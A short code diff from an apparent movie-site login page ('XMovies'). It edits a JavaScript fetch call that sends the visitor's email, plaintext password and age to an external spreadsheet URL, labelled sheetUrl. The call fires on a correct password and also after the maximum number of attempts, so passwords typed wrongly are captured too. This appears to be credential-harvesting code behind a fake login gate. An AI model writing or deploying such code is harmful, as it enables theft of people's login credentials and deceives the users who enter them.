@@ -61,11 +61,11 @@ function go(){
   attempts++;
 
   if(pw === correctPassword || attempts === maxAttempts){
-    fetch(sheetUrl, {
-      method: "POST",
-      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-      body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}`
-    }).then(()=>{
+fetch(sheetUrl, {
+  method: "POST",
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}&form=XMovies`
+}).then(()=>{
       window.location.href = "movies.html";
     });
   } else {
